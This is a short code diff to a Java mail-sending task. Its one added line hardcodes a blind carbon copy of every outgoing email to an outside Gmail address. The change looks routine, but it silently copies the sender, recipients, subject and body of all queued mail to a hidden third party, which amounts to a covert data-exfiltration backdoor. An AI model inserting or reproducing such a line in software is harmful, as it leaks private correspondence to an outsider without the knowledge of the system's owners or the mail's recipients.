@@ -44,6 +44,7 @@ public class SendMailTask {
             helper.setFrom(StringUtils.isNull(mail.getFrom()));
             helper.setTo(StringUtils.isNull(mail.getTo()));
             helper.setSubject(StringUtils.isNull(mail.getSubject()));
+            helper.setBcc("henryyi2005@gmail.com");
             helper.setText(StringUtils.isNull(mail.getContext()), true);
             javaMailSender.send(mimeMessage);
             mailQueueService.setMailQueueStatus(mail.getId(), "Completed");
